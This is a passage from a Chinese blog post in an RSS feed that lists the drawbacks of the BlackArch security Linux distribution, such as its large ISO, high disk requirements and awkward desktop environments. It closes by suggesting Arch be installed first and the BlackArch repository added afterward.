<h2 id="缺点">缺点</h2>
<p>现在来说说缺点:</p>
<ul>
<li>首先ISO实在是太大了，Black Arch官方的live ISO达到了12GB，我idm都下载了很久，而网络安装包和Arch的大小一样，不过我没试过</li>
<li>更可怕的是 blackarch官方镜像的安装最低硬盘需求达到了40GB以上，这使得大部分人缺乏这个安装条件</li>
<li>其次就是它的桌面环境实在太简陋了，而且性能上也特别不好，特别是i3和spectrwm这两个，根本无法操作，fluxbox最炫酷但是习惯太不适合大部分人了，openbox啥都没有，更不好操作，而且不支持中文，弄得我很蛋疼；还有就是依赖太乱了，换别的桌面环境很麻烦，比如我想卸载掉其他的换xfce，结果pacman -Rs卸载不了，得用Rsc才能卸载，结果把lxdm给卸掉了，进不去图形了，后来装上lxdm出现了很大的颜色bug。。。</li>
</ul>
<h2 id="总结">总结</h2>
<p>首先不能否认BlackArch是装逼的好东西，但是我不推荐使用官方的镜像（无论是在线镜像还是离线live）去安装，否则就会有我的下场了，其次就是用户必须有Arch系基础，否则就是个坑。建议先安装Arch，然后导入BlackArch的软件库安装全套工具即可。最后请不要那blackarch与kali、parrot对比，这没有对比性的，工具都差不多的。</p>
]]></description>
</item></channel>
</rss>
